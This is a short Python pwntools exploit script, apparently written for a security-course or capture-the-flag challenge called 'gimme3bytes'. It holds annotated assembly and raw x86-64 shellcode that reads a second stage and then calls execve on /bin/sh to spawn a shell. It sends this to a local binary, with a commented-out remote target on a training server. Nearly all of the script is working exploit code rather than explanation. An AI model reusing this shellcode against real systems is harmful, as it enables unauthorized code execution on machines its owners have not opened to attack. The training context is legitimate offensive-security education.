from pwn import *

asm_code = """
pop rdx  -->in this way an integer is in rdx (actually a pointer to an instruction after the return of function)
syscall
3 nop
xor rdx, rdx
mov rdi, rsi
xor rsi, rsi
mov rax, 59
add rdi, 25
syscall + /bin/sh

"""

context.arch = 'amd64'

shellcode = b"\x5A\x0F\x05\x90\x90\x90\x48\x31\xD2\x48\x89\xF7\x48\x31\xF6\x48\xC7\xC0\x3B\x00\x00\x00\x48\x83\xC7\x19\x0F\x05/bin/sh"
p = process("./gimme3bytes")
"""gdb.attach(p, '''
    b main           
''')
input("wait")"""
#p = remote("bin.training.offdef.it", 2004)
p.send(shellcode)
p.interactive()